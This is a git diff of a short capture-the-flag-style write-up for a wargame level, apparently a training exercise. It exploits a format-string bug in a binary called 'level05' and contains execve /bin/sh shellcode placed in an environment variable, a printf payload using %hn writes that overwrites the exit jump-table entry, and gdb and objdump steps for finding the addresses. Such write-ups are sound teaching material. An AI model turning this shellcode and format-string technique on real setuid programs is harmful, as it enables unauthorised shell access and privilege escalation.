@@ -1,11 +1,14 @@
-export SHELLCODE=`python -c 'print("\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+This level is about a printf string exploit
+We though that using a shellcode in the environment was the simpliest way to access a shell as level06
 
+We overwrite the exit address in the plt entry with the printf string exploit.
+We encountered a problem: the access is too long (64 bits).
+So we have to write the memory address with two printf argument
 
-(python -c 'print("\xe2\x97\x04\x08\xe0\x97\x04\x08" + "%55232x"  + "%11$hn" + "%10295x" + "%10$hn")';cat) | ./level05
+1. Shellcode
+Export SHELLCODE=`python -c 'print("\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
 
-0x80497e0 0x80497e2		-> addresses we write the shellcode address
-
-===============================================
+2. Find the address of exit in the plt entry:
 ```
 objdump -M intel -d ./level05  | grep exit -C 2
 [...]
@@ -13,21 +16,23 @@ objdump -M intel -d ./level05  | grep exit -C 2
 8048370:	ff 25 e0 97 04 08    	jmp    DWORD PTR ds: [ 0x80497e0 ]
 [...]
 ```
-===============================================
+
+3.Find address of environment variable in gdb:
+```
+unset env LINES
+unset env COLUMNS
+x/s *((char **)environ+X
+(gdb) x/s *((char **)environ+3
+0xffffd74d:      "SHELLCODE=[...]"
+```
+
+4.Command line and explanation
+
+(python -c 'print("\xe2\x97\x04\x08\xe0\x97\x04\x08" + "%55232x"  + "%11$hn" + "%10295x" + "%10$hn")';cat) | ./level05
+
+0x80497e0 0x80497e2		-> addresses we write the shellcode address
 
 "%11$hn"				-> 11th arg of printf (0x80497e0)
 "%10$hn"				-> 10th arg of printf (0x80497e2)
 
-"%55232x" + "%10295x"	-> address of our shellcode (split in two)
-
-===============================================
-Find address of environment variable in gdb:
-
-unset env LINES
-unset env COLUMNS
-
-x/s *((char **)environ+X
-===============================================
-
-(gdb) x/s *((char **)environ+3
-0xffffd74d:      "SHELLCODE=
+"%55232x" + "%10295x"	-> address of our shellcode (splitted and converted to decimal)
